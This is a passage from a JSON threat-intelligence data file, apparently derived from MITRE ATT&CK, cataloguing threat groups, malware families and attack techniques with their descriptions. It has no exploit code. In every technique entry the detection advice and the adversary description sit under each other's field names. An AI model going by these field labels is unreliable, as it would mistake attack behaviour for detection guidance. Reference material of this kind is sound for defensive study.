                    "T1546.009": "AppCert DLLs",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.011": "Rundll32",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1129": "Shared Modules",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 17
        },
        {
            "id": "G0068",
            "type": "group",
            "attributes": {
                "val": 3,
                "name": "PLATINUM",
                "aliases": [],
                "description": "PLATINUM is an activity group that has targeted victims since at least 2009. The group has focused on targets associated with governments and related organizations in South and Southeast Asia.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0201": "JPIN",
                    "S0202": "adbupd",
                    "S0200": "Dipsind"
                },
                "techniques": {
                    "T1204.002": "Malicious File",
                    "T1566.001": "Spearphishing Attachment",
                    "T1056.004": "Credential API Hooking",
                    "T1056.001": "Keylogging",
                    "T1003.001": "LSASS Memory",
                    "T1189": "Drive-by Compromise",
                    "T1105": "Ingress Tool Transfer",
                    "T1095": "Non-Application Layer Protocol",
                    "T1094": "Custom Command and Control Protocol",
                    "T1068": "Exploitation for Privilege Escalation",
                    "T1055": "Process Injection",
                    "T1036": "Masquerading"
                }
            }
        },
        {
            "id": "S0201",
            "type": "tool",
            "attributes": {
                "name": "JPIN",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "JPIN is a custom-built backdoor family used by PLATINUM. Evidence suggests developers of JPIN and Dipsind code bases were related in some way.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.003": "Mail Protocols",
                    "T1071.002": "File Transfer Protocols",
                    "T1069.001": "Local Groups",
                    "T1059.003": "Windows Command Shell",
                    "T1518.001": "Security Software Discovery",
                    "T1562.001": "Disable or Modify Tools",
                    "T1056.001": "Keylogging",
                    "T1222.001": "Windows File and Directory Permissions Modification",
                    "T1070.004": "File Deletion",
                    "T1197": "BITS Jobs",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1055": "Process Injection",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery",
                    "T1012": "Query Registry",
                    "T1007": "System Service Discovery"
                }
            },
            "val": 20
        },
        {
            "id": "T1546.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Windows Management Instrumentation Event Subscription",
                "chain_phase": "privilege-escalation",
                "description": "Monitor WMI event subscription entries, comparing current WMI event subscriptions to known good subscriptions for each host. Tools such as Sysinternals Autoruns may also be used to detect WMI changes that could be attempts at persistence. (Citation: TechNet Autoruns) (Citation: Medium Detecting WMI Persistence) Monitor for the creation of new WMI <code>EventFilter</code>, <code>EventConsumer</code>, and <code>FilterToConsumerBinding</code> events. Event ID 5861 is logged on Windows 10 systems when new <code>EventFilterToConsumerBinding</code> events are created.(Citation: Elastic - Hunting for Persistence Part 1)\n\nMonitor processes and command-line arguments that can be used to register WMI persistence, such as the <code> Register-WmiEvent</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet (Citation: Microsoft Register-WmiEvent), as well as those that result from the execution of subscriptions (i.e. spawning from the WmiPrvSe.exe WMI Provider Host process).",
                "detection": "Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user loging, or the computer's uptime. \n\nAdversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.   Adversaries may also compile WMI scripts into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.  \n\nWMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "S0202",
            "type": "tool",
            "attributes": {
                "name": "adbupd",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "adbupd is a backdoor used by PLATINUM that is similar to Dipsind.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.002": "Asymmetric Cryptography",
                    "T1059.003": "Windows Command Shell",
                    "T1546.003": "Windows Management Instrumentation Event Subscription"
                }
            },
            "val": 3
        },
        {
            "id": "S0200",
            "type": "tool",
            "attributes": {
                "name": "Dipsind",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Dipsind is a malware family of backdoors that appear to be used exclusively by PLATINUM.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1059.003": "Windows Command Shell",
                    "T1547.004": "Winlogon Helper DLL",
                    "T1105": "Ingress Tool Transfer",
                    "T1094": "Custom Command and Control Protocol",
                    "T1029": "Scheduled Transfer"
                }
            },
            "val": 8
        },
        {
            "id": "G0064",
            "type": "group",
            "attributes": {
                "val": 15,
                "name": "APT33",
                "aliases": [
                    "HOLMIUM",
                    "Elfin"
                ],
                "description": "APT33 is a suspected Iranian threat group that has carried out operations since at least 2013. The group has targeted organizations across multiple industries in the United States, Saudi Arabia, and South Korea, with a particular interest in the aviation and energy sectors.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0380": "StoneDrill",
                    "S0378": "PoshC2",
                    "S0371": "POWERTON",
                    "S0363": "Empire",
                    "S0358": "Ruler",
                    "S0349": "LaZagne",
                    "S0336": "NanoCore",
                    "S0194": "PowerSploit",
                    "S0198": "NETWIRE",
                    "S0199": "TURNEDUP",
                    "S0192": "Pupy",
                    "S0129": "AutoIt backdoor",
                    "S0095": "FTP",
                    "S0039": "Net",
                    "S0002": "Mimikatz"
                },
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1048.003": "Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
                    "T1132.001": "Standard Encoding",
                    "T1571": "Non-Standard Port",
                    "T1078.004": "Cloud Accounts",
                    "T1204.002": "Malicious File",
                    "T1204.001": "Malicious Link",
                    "T1059.005": "Visual Basic",
                    "T1059.001": "PowerShell",
                    "T1566.002": "Spearphishing Link",
                    "T1566.001": "Spearphishing Attachment",
                    "T1003.004": "LSA Secrets",
                    "T1003.005": "Cached Domain Credentials",
                    "T1560.001": "Archive via Utility",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1555": "Credentials from Password Stores",
                    "T1552.006": "Group Policy Preferences",
                    "T1003.001": "LSASS Memory",
                    "T1110.003": "Password Spraying",
                    "T1552.001": "Credentials In Files",
                    "T1546.003": "Windows Management Instrumentation Event Subscription",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1053.005": "Scheduled Task",
                    "T1203": "Exploitation for Client Execution",
                    "T1105": "Ingress Tool Transfer",
                    "T1078": "Valid Accounts",
                    "T1068": "Exploitation for Privilege Escalation",
                    "T1065": "Uncommonly Used Port",
                    "T1040": "Network Sniffing",
                    "T1027": "Obfuscated Files or Information",
                    "T0853": "Scripting",
                    "T0865": "Spearphishing Attachment",
                    "T0852": "Screen Capture"
                }
            }
        },
        {
            "id": "T1561.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Disk Structure Wipe",
                "chain_phase": "impact",
                "description": "Look for attempts to read/write to sensitive locations like the master boot record and the disk partition table. Monitor for direct access read/write attempts using the <code>\\\\\\\\.\\\\</code> notation.(Citation: Microsoft Sysmon v6 May 2017) Monitor for unusual kernel driver installation activity.",
                "detection": "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table. The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. Disk Structure Wipe may be performed in isolation, or along with Disk Content Wipe if all sectors of a disk are wiped.\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1561.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Disk Content Wipe",
                "chain_phase": "impact",
                "description": "Look for attempts to read/write to sensitive locations like the partition boot sector or BIOS parameter block/superblock. Monitor for direct access read/write attempts using the <code>\\\\\\\\.\\\\</code> notation.(Citation: Microsoft Sysmon v6 May 2017) Monitor for unusual kernel driver installation activity.",
                "detection": "Adversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources.\n\nAdversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface. Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data. Adversaries have been observed leveraging third-party drivers like RawDisk to directly access disk content. This behavior is distinct from Data Destruction because sections of the disk are erased instead of individual files.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0380",
            "type": "tool",
            "attributes": {
                "name": "StoneDrill",
                "aliases": [
                    "DROPSHOT"
                ],
                "labels": [
                    "malware"
                ],
                "description": "StoneDrill is wiper malware discovered in destructive campaigns against both Middle Eastern and European targets in association with APT33.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1059.005": "Visual Basic",
                    "T1518.001": "Security Software Discovery",
                    "T1561.002": "Disk Structure Wipe",
                    "T1561.001": "Disk Content Wipe",
                    "T1070.004": "File Deletion",
                    "T1497": "Virtualization/Sandbox Evasion",
                    "T1485": "Data Destruction",
                    "T1124": "System Time Discovery",
                    "T1113": "Screen Capture",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery",
                    "T1055": "Process Injection",
                    "T1047": "Windows Management Instrumentation",
                    "T1027": "Obfuscated Files or Information",
                    "T1012": "Query Registry"
                }
            },
            "val": 15
        },
        {
            "id": "S0378",
            "type": "tool",
            "attributes": {
                "name": "PoshC2",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "PoshC2 is an open source remote administration and post-exploitation framework that is publicly available on GitHub. The server-side components of the tool are primarily written in Python, while the implants are written in PowerShell. Although PoshC2 is primarily focused on Windows implantation, it does contain a basic Python dropper for Linux/macOS.",
                "platforms": [
                    "Windows",
                    "Linux",
                    "macOS"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1069.001": "Local Groups",
                    "T1569.002": "Service Execution",
                    "T1087.002": "Domain Account",
                    "T1087.001": "Local Account",
                    "T1560.001": "Archive via Utility",
                    "T1134.002": "Create Process with Token",
                    "T1557.001": "LLMNR/NBT-NS Poisoning and SMB Relay",
                    "T1056.001": "Keylogging",
                    "T1003.001": "LSASS Memory",
                    "T1552.001": "Credentials In Files",
                    "T1550.002": "Pass the Hash",
                    "T1548.002": "Bypass User Account Control",
                    "T1546.003": "Windows Management Instrumentation Event Subscription",
                    "T1482": "Domain Trust Discovery",
                    "T1210": "Exploitation of Remote Services",
                    "T1201": "Password Policy Discovery",
                    "T1134": "Access Token Manipulation",
                    "T1119": "Automated Collection",
                    "T1110": "Brute Force",
                    "T1090": "Proxy",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1068": "Exploitation for Privilege Escalation",
                    "T1055": "Process Injection",
                    "T1049": "System Network Connections Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1046": "Network Service Scanning",
                    "T1040": "Network Sniffing",
                    "T1016": "System Network Configuration Discovery",
                    "T1007": "System Service Discovery"
                }
            },
            "val": 31
        },
        {
            "id": "S0371",
            "type": "tool",
            "attributes": {
                "name": "POWERTON",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "POWERTON is a custom PowerShell backdoor first observed in 2018. It has typically been deployed as a late-stage backdoor by APT33. At least two variants of the backdoor have been identified, with the later version containing improved functionality.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1059.001": "PowerShell",
                    "T1003.002": "Security Account Manager",
                    "T1546.003": "Windows Management Instrumentation Event Subscription",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1043": "Commonly Used Port"
                }
            },
            "val": 7
        },
        {
            "id": "T1137.004",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Outlook Home Page",
                "chain_phase": "persistence",
                "description": "Microsoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.(Citation: Microsoft Detect Outlook Forms) SensePost, whose tool [Ruler](https://attack.mitre.org/software/S0358) can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.(Citation: SensePost NotRuler)\n\nCollect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior.",
                "detection": "Adversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.\n\nOnce malicious home pages have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "Office 365"
                ]
            }
        },
        {
            "id": "T1137.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Outlook Forms",
                "chain_phase": "persistence",
                "description": "Microsoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.(Citation: Microsoft Detect Outlook Forms) SensePost, whose tool [Ruler](https://attack.mitre.org/software/S0358) can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.(Citation: SensePost NotRuler)\n\nCollect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior.",
                "detection": "Adversaries may abuse Microsoft Outlook forms to obtain persistence on a compromised system. Outlook forms are used as templates for presentation and functionality in Outlook messages. Custom Outlook forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom Outlook form.\n\nOnce malicious forms have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious forms will execute when an adversary sends a specifically crafted email to the user.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "Office 365"
                ]
            }
        },
        {
            "id": "T1137.005",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Outlook Rules",
                "chain_phase": "persistence",
                "description": "Microsoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.(Citation: Microsoft Detect Outlook Forms) SensePost, whose tool [Ruler](https://attack.mitre.org/software/S0358) can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.(Citation: SensePost NotRuler)\n\nCollect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior.",
                "detection": "Adversaries may abuse Microsoft Outlook rules to obtain persistence on a compromised system. Outlook rules allow a user to define automated behavior to manage email messages. A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender. Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.\n\nOnce malicious rules have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious rules will execute when an adversary sends a specifically crafted email to the user.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "Office 365"
                ]
            }
        },
        {
            "id": "S0358",
            "type": "tool",
            "attributes": {
                "name": "Ruler",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "Ruler is a tool to abuse Microsoft Exchange services. It is publicly available on GitHub and the tool is executed via the command line. The creators of Ruler have also released a defensive tool, NotRuler, to detect its usage.",
                "platforms": [
                    "Windows",
                    "Office 365"
                ],
                "techniques": {
                    "T1087.003": "Email Account",
                    "T1137.004": "Outlook Home Page",
                    "T1137.003": "Outlook Forms",
                    "T1137.005": "Outlook Rules"
                }
            },
            "val": 4
        },
        {
            "id": "S0199",
            "type": "tool",
            "attributes": {
                "name": "TURNEDUP",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "TURNEDUP is a non-public backdoor. It has been dropped by APT33's StoneDrill malware.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1059.003": "Windows Command Shell",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1055.004": "Asynchronous Procedure Call",
                    "T1113": "Screen Capture",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery"
                }
            },
            "val": 6
        },
        {
            "id": "T1543.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Systemd Service",
                "chain_phase": "persistence",
                "description": "Systemd service unit files may be detected by auditing file creation and modification events within the <code>/etc/systemd/system</code>, <code>/usr/lib/systemd/system/</code>, and <code>/home/<username>/.config/systemd/user/</code> directories, as well as associated symbolic links. Suspicious processes or scripts spawned in this manner will have a parent process of ‘systemd’, a parent process ID of 1, and will usually execute as the ‘root’ user.\n\nSuspicious systemd services can also be identified by comparing results against a trusted system baseline. Malicious systemd services may be detected by using the systemctl utility to examine system wide services: <code>systemctl list-units -–type=service –all</code>. Analyze the contents of <code>.service</code> files present on the file system and ensure that they refer to legitimate, expected executables.\n\nAuditing the execution and command-line arguments of the 'systemctl' utility, as well related utilities such as <code>/usr/sbin/service</code> may reveal malicious systemd service execution.",
                "detection": "Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. The systemd service manager is commonly used for managing background daemon processes (also known as services) and other system resources. Systemd is the default initialization (init) system on many Linux distributions starting with Debian 8, Ubuntu 15.04, CentOS 7, RHEL 7, Fedora 15, and replaces legacy init systems including SysVinit and Upstart while remaining backwards compatible with the aforementioned init systems.\n\nSystemd utilizes configuration files known as service units to control how services boot and under what conditions. By default, these unit files are stored in the <code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code> directories and have the file extension <code>.service</code>. Each service unit file may contain numerous directives that can execute system commands:\n\n* ExecStart, ExecStartPre, and ExecStartPost directives cover execution of commands when a services is started manually by 'systemctl' or on system start if the service is set to automatically start. \n* ExecReload directive covers when a service restarts. \n* ExecStop and ExecStopPost directives cover when a service is stopped or manually by 'systemctl'.\n\nAdversaries have used systemd functionality to establish persistent access to victim systems by creating and/or modifying service unit files that cause systemd to execute malicious commands at system boot.\n\nWhile adversaries typically require root privileges to create/modify service unit files in the <code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code> directories, low privilege users can create/modify service unit files in directories such as <code>~/.config/systemd/user/</code> to achieve user-level persistence.",
                "is_subtype": true,
                "platforms": [
                    "Linux"
                ]
            }
        },
        {
            "id": "S0192",
            "type": "tool",
            "attributes": {
                "name": "Pupy",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "Pupy is an open source, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool.  It is written in Python and can be generated as a payload in several different ways (Windows exe, Python file, PowerShell oneliner/file, Linux elf, APK, Rubber Ducky, etc.).  Pupy is publicly available on GitHub.",
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS",
                    "Android"
                ],
                "techniques": {
                    "T1573.002": "Asymmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1569.002": "Service Execution",
                    "T1059.006": "Python",
                    "T1059.001": "PowerShell",
                    "T1497.001": "System Checks",
                    "T1087.001": "Local Account",
                    "T1003.004": "LSA Secrets",
                    "T1003.005": "Cached Domain Credentials",
                    "T1560.001": "Archive via Utility",
                    "T1114.001": "Local Email Collection",
                    "T1134.001": "Token Impersonation/Theft",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1557.001": "LLMNR/NBT-NS Poisoning and SMB Relay",
                    "T1056.001": "Keylogging",
                    "T1555": "Credentials from Password Stores",
                    "T1003.001": "LSASS Memory",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1552.001": "Credentials In Files",
                    "T1550.003": "Pass the Ticket",
                    "T1548.002": "Bypass User Account Control",
                    "T1070.001": "Clear Windows Event Logs",
                    "T1136.002": "Domain Account",
                    "T1136.001": "Local Account",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1543.002": "Systemd Service",
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1135": "Network Share Discovery",
                    "T1125": "Video Capture",
                    "T1123": "Audio Capture",
                    "T1113": "Screen Capture",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1046": "Network Service Scanning",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1033": "System Owner/User Discovery",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 40
        },
        {
            "id": "S0129",
            "type": "tool",
            "attributes": {
                "name": "AutoIt backdoor",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "AutoIt backdoor is malware that has been used by the actors responsible for the MONSOON campaign. The actors frequently used it in weaponized .pps files exploiting CVE-2014-6352.  This malware makes use of the legitimate scripting language for Windows GUI automation with the same name.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1132.001": "Standard Encoding",
                    "T1059.001": "PowerShell",
                    "T1548.002": "Bypass User Account Control",
                    "T1083": "File and Directory Discovery"
                }
            },
            "val": 4
        },
        {
            "id": "G0062",
            "type": "group",
            "attributes": {
                "val": 4,
                "name": "TA459",
                "aliases": [],
                "description": "TA459 is a threat group believed to operate out of China that has targeted countries including Russia, Belarus, Mongolia, and others.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0230": "ZeroT",
                    "S0033": "NetTraveler",
                    "S0032": "gh0st RAT",
                    "S0013": "PlugX"
                },
                "techniques": {
                    "T1204.002": "Malicious File",
                    "T1059.005": "Visual Basic",
                    "T1059.001": "PowerShell",
                    "T1566.001": "Spearphishing Attachment",
                    "T1203": "Exploitation for Client Execution"
                }
            }
        },
        {
            "id": "T1001.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Steganography",
                "chain_phase": "command-and-control",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
                "detection": "Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0230",
            "type": "tool",
            "attributes": {
                "name": "ZeroT",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "ZeroT is a Trojan used by TA459, often in conjunction with PlugX.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1001.002": "Steganography",
                    "T1574.002": "DLL Side-Loading",
                    "T1027.002": "Software Packing",
                    "T1027.001": "Binary Padding",
                    "T1548.002": "Bypass User Account Control",
                    "T1543.003": "Windows Service",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 13
        },
        {
            "id": "S0033",
            "type": "tool",
            "attributes": {
                "name": "NetTraveler",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "NetTraveler is malware that has been used in multiple cyber espionage campaigns for basic surveillance of victims. The earliest known samples have timestamps back to 2005, and the largest number of observed samples were created between 2010 and 2013.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1056.001": "Keylogging",
                    "T1010": "Application Window Discovery"
                }
            },
            "val": 2
        },
        {
            "id": "G0066",
            "type": "group",
            "attributes": {
                "val": 9,
                "name": "Elderwood",
                "aliases": [
                    "Elderwood Gang",
                    "Beijing Group",
                    "Sneaky Panda"
                ],
                "description": "Elderwood is a suspected Chinese cyber espionage group that was reportedly responsible for the 2009 Google intrusion known as Operation Aurora.  The group has targeted defense organizations, supply chain manufacturers, human rights and nongovernmental organizations (NGOs), and IT service providers.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0203": "Hydraq",
                    "S0211": "Linfo",
                    "S0205": "Naid",
                    "S0204": "Briba",
                    "S0208": "Pasam",
                    "S0206": "Wiarp",
                    "S0210": "Nerex",
                    "S0207": "Vasport",
                    "S0012": "PoisonIvy"
                },
                "techniques": {
                    "T1204.002": "Malicious File",
                    "T1204.001": "Malicious Link",
                    "T1566.002": "Spearphishing Link",
                    "T1566.001": "Spearphishing Attachment",
                    "T1027.002": "Software Packing",
                    "T1189": "Drive-by Compromise",
                    "T1203": "Exploitation for Client Execution",
                    "T1105": "Ingress Tool Transfer",
                    "T1027": "Obfuscated Files or Information"
                }
            }
        },
        {
            "id": "T1048",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Exfiltration Over Alternative Protocol",
                "chain_phase": "exfiltration",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)",
                "detection": "Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  \n\nAlternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Different protocol channels could also include Web services such as cloud storage. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. \n\nExfiltration Over Alternative Protocol can be done using various common operating system utilities such as Net/SMB or FTP.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0203",
            "type": "tool",
            "attributes": {
                "name": "Hydraq",
                "aliases": [
                    "Aurora",
                    "9002 RAT"
                ],
                "labels": [
                    "malware"
                ],
                "description": "Hydraq is a data-theft trojan first used by Elderwood in the 2009 Google intrusion known as Operation Aurora, though variations of this trojan have been used in more recent campaigns by other Chinese actors, possibly including APT17.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1569.002": "Service Execution",
                    "T1070.004": "File Deletion",
                    "T1070.001": "Clear Windows Event Logs",
                    "T1543.003": "Windows Service",
                    "T1134": "Access Token Manipulation",
                    "T1129": "Shared Modules",
                    "T1113": "Screen Capture",
                    "T1112": "Modify Registry",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1048": "Exfiltration Over Alternative Protocol",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery",
                    "T1012": "Query Registry",
                    "T1007": "System Service Discovery",
                    "T1005": "Data from Local System"
                }
            },
            "val": 19
        },
        {
            "id": "S0211",
            "type": "tool",
            "attributes": {
                "name": "Linfo",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Linfo is a rootkit trojan used by Elderwood to open a backdoor on compromised hosts.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1059.003": "Windows Command Shell",
                    "T1070.004": "File Deletion",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1029": "Scheduled Transfer",
                    "T1008": "Fallback Channels",
                    "T1005": "Data from Local System"
                }
            },
            "val": 9
        },
        {
            "id": "S0205",
            "type": "tool",
            "attributes": {
                "name": "Naid",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Naid is a trojan used by Elderwood to open a backdoor on compromised hosts.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1543.003": "Windows Service",
                    "T1112": "Modify Registry",
                    "T1094": "Custom Command and Control Protocol",
                    "T1082": "System Information Discovery",
                    "T1043": "Commonly Used Port",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 6
        },
        {
            "id": "S0204",
            "type": "tool",
            "attributes": {
                "name": "Briba",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Briba is a trojan used by Elderwood to open a backdoor and download files on to compromised hosts.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.011": "Rundll32",
                    "T1543.003": "Windows Service",
                    "T1105": "Ingress Tool Transfer",
                    "T1043": "Commonly Used Port"
                }
            },
            "val": 5
        },
        {
            "id": "T1547.008",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "LSASS Driver",
                "chain_phase": "persistence",
